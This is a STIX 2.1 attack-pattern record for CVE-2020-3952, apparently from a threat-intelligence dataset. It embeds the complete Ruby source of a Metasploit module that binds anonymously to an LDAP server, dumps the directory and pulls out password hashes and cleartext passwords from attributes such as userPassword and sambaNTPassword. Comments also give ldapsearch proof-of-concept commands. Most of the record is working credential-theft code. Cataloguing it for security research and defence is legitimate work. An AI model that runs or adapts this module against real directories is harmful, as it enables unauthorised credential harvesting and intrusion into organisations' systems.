{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b3c8623d-a280-4972-881f-4c6d208be5cd",
    "created": "2024-08-14T16:32:41.205265Z",
    "modified": "2024-08-14T16:32:41.205269Z",
    "name": "LDAP Information Disclosure",
    "description": " This module uses an anonymous-bind LDAP connection to dump data from an LDAP server. Searching for attributes with user credentials (e.g. userPassword). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/ldap_hashdump.rb",
            "external_id": "ldap_hashdump.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-3952"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2020-0006.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::LDAP\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'LDAP Information Disclosure',\n        'Description' => %q{\n          This module uses an anonymous-bind LDAP connection to dump data from\n          an LDAP server. Searching for attributes with user credentials\n          (e.g. userPassword).\n        },\n        'Author' => [\n          'Hynek Petrak' # Discovery, module\n        ],\n        'References' => [\n          ['CVE', '2020-3952'],\n          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0006.html']\n        ],\n        'DisclosureDate' => '2020-07-23',\n        'License' => MSF_LICENSE,\n        'Actions' => [\n          ['Dump', { 'Description' => 'Dump all LDAP data' }]\n        ],\n        'DefaultAction' => 'Dump',\n        'DefaultOptions' => {\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(636), # SSL/TLS\n      OptInt.new('MAX_LOOT', [false, 'Maximum number of LDAP entries to loot', nil]),\n      OptInt.new('READ_TIMEOUT', [false, 'LDAP read timeout in seconds', 600]),\n      OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),\n      OptString.new('USER_ATTR', [false, 'LDAP attribute(s), that contains username', 'dn']),\n      OptString.new('PASS_ATTR', [\n        true, 'LDAP attribute, that contains password hashes',\n        'userPassword, sambantpassword, sambalmpassword, mailuserpassword, password, pwdhistory, passwordhistory, clearpassword'\n        # Other potential candidates:\n        # ipanthash, krbpwdhistory, krbmkey, userpkcs12, unixUserPassword, krbprincipalkey, radiustunnelpassword, sambapasswordhistory\n      ])\n    ])\n  end\n\n  def user_attr\n    @user_attr ||= 'dn'\n  end\n\n  def print_ldap_error(ldap)\n    opres = ldap.get_operation_result\n    msg = \"LDAP error #{opres.code}: #{opres.message}\"\n    unless opres.error_message.to_s.empty?\n      msg += \" - #{opres.error_message}\"\n    end\n    print_error(\"#{peer} #{msg}\")\n  end\n\n  # PoC using ldapsearch(1):\n  #\n  # Retrieve root DSE with base DN:\n  #   ldapsearch -xb \"\" -s base -H ldap://[redacted]\n  #\n  # Dump data using discovered base DN:\n  #   ldapsearch -xb bind_dn -H ldap://[redacted] \\* + -\n  def run_host(ip)\n    @rhost = ip\n\n    @read_timeout = datastore['READ_TIMEOUT'] || 600\n\n    entries_returned = 0\n\n    print_status(\"#{peer} Connecting...\")\n    ldap_new do |ldap|\n      if ldap.get_operation_result.code == 0\n        vprint_status(\"#{peer} LDAP connection established\")\n      else\n        # Even if we get \"Invalid credentials\" error, we may proceed with anonymous bind\n        print_ldap_error(ldap)\n      end\n\n      if (base_dn_tmp = datastore['BASE_DN'])\n        vprint_status(\"#{peer} User-specified base DN: #{base_dn_tmp}\")\n        naming_contexts = [base_dn_tmp]\n      else\n        vprint_status(\"#{peer} Discovering base DN(s) automatically\")\n\n        begin\n          # HACK: fix lack of read/write timeout in Net::LDAP\n          Timeout.timeout(@read_timeout) do\n            naming_contexts = get_naming_contexts(ldap)\n          end\n        rescue Timeout::Error\n          fail_with(Failure::TimeoutExpired, 'The timeout expired while reading naming contexts')\n        ensure\n          unless ldap.get_operation_result.code == 0\n            print_ldap_error(ldap)\n          end\n        end\n\n        if naming_contexts.nil? || naming_contexts.empty?\n          vprint_warning(\"#{peer} Falling back to an empty base DN\")\n          naming_contexts = ['']\n        end\n      end\n\n      @max_loot = datastore['MAX_LOOT']\n\n      @user_attr ||= datastore['USER_ATTR']\n      @user_attr ||= 'dn'\n      vprint_status(\"#{peer} Taking '#{@user_attr}' attribute as username\")\n\n      pass_attr ||= datastore['PASS_ATTR']\n      @pass_attr_array = pass_attr.split(/[,\\s]+/).compact.reject(&:empty?).map(&:downcase)\n\n      # Dump root DSE for useful information, e.g. dir admin\n      if @max_loot.nil? || (@max_loot > 0)\n        print_status(\"#{peer} Dumping data for root DSE\")\n\n        ldap_search(ldap, 'root DSE', {\n          ignore_server_caps: true,\n          scope: Net::LDAP::SearchScope_BaseObject\n        })\n      end\n\n      naming_contexts.each do |base_dn|\n        print_status(\"#{peer} Searching base DN='#{base_dn}'\")\n        entries_returned += ldap_search(ldap, base_dn, {\n          base: base_dn\n        })\n      end\n    end\n\n    # Safe if server did not returned anything\n    unless (entries_returned > 0)\n      fail_with(Failure::NotVulnerable, 'Server did not return any data, seems to be safe')\n    end\n  rescue Timeout::Error\n    fail_with(Failure::TimeoutExpired, 'The timeout expired while searching directory')\n  rescue Net::LDAP::PDU::Error, Net::BER::BerError, Net::LDAP::Error, NoMethodError => e\n    fail_with(Failure::UnexpectedReply, \"Exception occurred: #{e.class}: #{e.message}\")\n  end\n\n  def ldap_search(ldap, base_dn, args)\n    entries_returned = 0\n    creds_found = 0\n    def_args = {\n      base: '',\n      return_result: false,\n      attributes: %w[* + -]\n    }\n    Tempfile.create do |f|\n      f.write(\"# LDIF dump of #{peer}, base DN='#{base_dn}'\\n\")\n      f.write(\"\\n\")\n      begin\n        # HACK: fix lack of read/write timeout in Net::LDAP\n        Timeout.timeout(@read_timeout) do\n          ldap.search(def_args.merge(args)) do |entry|\n            entries_returned += 1\n            if @max_loot.nil? || (entries_returned <= @max_loot)\n              f.write(\"# #{entry.dn}\\n\")\n              f.write(entry.to_ldif.force_encoding('utf-8'))\n              f.write(\"\\n\")\n            end\n            @pass_attr_array.each do |attr|\n              if entry[attr].any?\n                creds_found += process_hash(entry, attr)\n              end\n            end\n          end\n        end\n      rescue Timeout::Error\n        print_error(\"#{peer} Host timeout reached while searching '#{base_dn}'\")\n        return entries_returned\n      ensure\n        unless ldap.get_operation_result.code == 0\n          print_ldap_error(ldap)\n        end\n        if entries_returned > 0\n          print_status(\"#{peer} #{entries_returned} entries, #{creds_found} creds found in '#{base_dn}'.\")\n          f.rewind\n          pillage(f.read, base_dn)\n        elsif ldap.get_operation_result.code == 0\n          print_error(\"#{peer} No entries returned for '#{base_dn}'.\")\n        end\n      end\n    end\n    entries_returned\n  end\n\n  def pillage(ldif, base_dn)\n    vprint_status(\"#{peer} Storing LDAP data for base DN='#{base_dn}' in loot\")\n\n    ltype = base_dn.clone\n    ltype.gsub!(/ /, '_')\n    ltype.gsub!(/,/, '.')\n    ltype.gsub!(/(ou=|fn=|cn=|o=|dc=|c=)/i, '')\n    ltype.gsub!(/[^a-z0-9._-]+/i, '')\n    ltype = ltype.last(16)\n\n    ldif_filename = store_loot(\n      ltype, # ltype\n      'text/plain', # ctype\n      @rhost, # host\n      ldif, # data\n      nil, # filename\n      \"Base DN: #{base_dn.gsub(/[^[:print:]]/, '')}\" # info, remove null char from base_dn\n    )\n\n    unless ldif_filename\n      print_error(\"#{peer} Could not store LDAP data in loot\")\n      return\n    end\n\n    print_good(\"#{peer} Saved LDAP data to #{ldif_filename}\")\n  end\n\n  def decode_pwdhistory(hash)\n    # https://ldapwiki.com/wiki/PwdHistory\n    parts = hash.split('#', 4)\n    unless parts.length == 4\n      return hash\n    end\n\n    hash = parts.last\n    unless hash.starts_with?('{')\n      decoded = Base64.decode64(hash)\n      if decoded.starts_with?('{') || (decoded =~ /[^[:print:]]/).nil?\n        return decoded\n      end\n    end\n    hash\n  end\n\n  def process_hash(entry, attr)\n    service_details = {\n      workspace_id: myworkspace_id,\n      module_fullname: fullname,\n      origin_type: :service,\n      address: @rhost,\n      port: rport,\n      protocol: 'tcp',\n      service_name: 'ldap'\n    }\n\n    creds_found = 0\n\n    # This is the \"username\"\n    dn = entry[@user_attr].first # .dn\n\n    entry[attr].each do |hash|\n      if attr == 'pwdhistory'\n        hash = decode_pwdhistory(hash)\n      end\n\n      # 20170619183528ZHASHVALUE\n      if attr == 'passwordhistory' && hash.start_with?(/\\d{14}Z/i)\n        hash.slice!(/\\d{14}Z/i)\n      end\n\n      # Cases *[crypt}, !{crypt} ...\n      hash.gsub!(/.?{crypt}/i, '{crypt}')\n\n      # We observe some servers base64 encdode the hash string\n      # and add {crypt} prefix to the base64 encoded value\n      # e2NyeXB0f in base64 means {crypt\n      # e3NtZD is {smd\n      if hash.starts_with?(/{crypt}(e2NyeXB0f|e3NtZD)/)\n        begin\n          hash = Base64.strict_decode64(hash.delete_prefix('{crypt}'))\n        rescue ArgumentError\n          nil\n        end\n      end\n\n      # Some have new lines at the end\n      hash.chomp!\n\n      # Skip empty or invalid hashes, e.g. '{CRYPT}x', xxxx, ****\n      if hash.nil? || hash.empty? ||\n         (hash.start_with?(/{crypt}/i) && hash.length < 10) ||\n         hash.start_with?('*****') ||\n         hash.start_with?(/yyyyyy/i) ||\n         hash == '*' ||\n         hash.end_with?('*LK*', # account locked\n                        '*NP*') || # password has never been set\n         # reject {SASL} pass-through\n         hash =~ /{sasl}/i ||\n         hash.start_with?(/xxxxx/i) ||\n         (attr =~ /^samba(lm|nt)password$/ &&\n          (hash.length != 32 ||\n           hash =~ /^aad3b435b51404eeaad3b435b51404ee$/i ||\n           hash =~ /^31d6cfe0d16ae931b73c59d7e0c089c0$/i)) ||\n         # observed sambapassword history with either 56 or 64 zeros\n         (attr == 'sambapasswordhistory' && hash =~ /^(0{64}|0{56})$/)\n        next\n      end\n\n      case attr\n      when 'sambalmpassword'\n        hash_format = 'lm'\n      when 'sambantpassword'\n        hash_format = 'nt'\n      when 'sambapasswordhistory'\n        # 795471346779677A336879366B654870 1F18DC5E346FDA5E335D9AE207C82CC9\n        # where the left part is a salt and the right part is MD5(Salt+NTHash)\n        # attribute value may contain multiple concatenated history entries\n        # for john sort of 'md5($s.md4(unicode($p)))' - not tested\n        hash_format = 'sambapasswordhistory'\n      when 'krbprincipalkey'\n        hash_format = 'krbprincipal'\n        # TODO: krbprincipalkey is asn.1 encoded string. In case of vmware vcenter 6.7\n        # it contains user password encrypted with (23) rc4-hmac and (18) aes256-cts-hmac-sha1-96:\n        # https://github.com/vmware/lightwave/blob/d50d41edd1d9cb59e7b7cc1ad284b9e46bfa703d/vmdir/server/common/krbsrvutil.c#L480-L558\n        # Salted with principal name:\n        # https://github.com/vmware/lightwave/blob/c4ad5a67eedfefe683357bc53e08836170528383/vmdir/thirdparty/heimdal/krb5-crypto/salt.c#L133-L175\n        # In the meantime, dump the base64 encoded value.\n        hash = Base64.strict_encode64(hash)\n      when 'userpkcs12'\n        # if we get non printable chars, encode into base64\n        if (hash =~ /[^[:print:]]/).nil?\n          hash_format = 'pkcs12'\n        else\n          hash_format = 'pkcs12-base64'\n          hash = Base64.strict_encode64(hash)\n        end\n      else\n        if hash.start_with?(/{crypt}.?\\$1\\$/i)\n          hash.gsub!(/{crypt}.{,2}\\$1\\$/i, '$1$')\n          hash_format = 'md5crypt'\n        elsif hash.start_with?(/{crypt}/i) && hash.length == 20\n          # handle {crypt}traditional_crypt case, i.e. explicitly set the hash format\n          hash.slice!(/{crypt}/i)\n          # FIXME: what is the right jtr_hash - des,crypt or descrypt ?\n          # identify_hash returns des,crypt, while JtR acceppts descrypt\n          hash_format = 'descrypt'\n        # TODO: not sure if we shall slice the prefixes here or in the JtR/Hashcat formatter\n        # elsif hash.start_with?(/{sha256}/i)\n        #  hash.slice!(/{sha256}/i)\n        #  hash_format = 'raw-sha256'\n        else\n          # handle vcenter vmdir binary hash format\n          if hash[0].ord == 1 && hash.length == 81\n            _type, hash, salt = hash.unpack('CH128H32')\n            hash = \"$dynamic_82$#{hash}$HEX$#{salt}\"\n          else\n            # Remove LDAP's {crypt} prefix from known hash types\n            hash.gsub!(/{crypt}.{,2}(\\$[0256][aby]?\\$)/i, '\\1')\n          end\n          hash_format = Metasploit::Framework::Hashes.identify_hash(hash)\n        end\n      end\n\n      # higlight unresolved hashes\n      hash_format = '{crypt}' if hash =~ /{crypt}/i\n\n      print_good(\"#{peer} Credentials (#{hash_format.empty? ? 'password' : hash_format}) found in #{attr}: #{dn}:#{hash}\")\n\n      # known hash types should have been identified,\n      # let's assume the rest are clear text passwords\n      if hash_format.nil? || hash_format.empty?\n        credential = create_credential(service_details.merge(\n          username: dn,\n          private_data: hash,\n          private_type: :password\n        ))\n      else\n        credential = create_credential(service_details.merge(\n          username: dn,\n          private_data: hash,\n          private_type: :nonreplayable_hash,\n          jtr_format: hash_format\n        ))\n      end\n\n      create_credential_login({\n        core: credential,\n        access_level: 'User',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }.merge(service_details))\n      creds_found += 1\n    end\n    creds_found\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-07-23"
}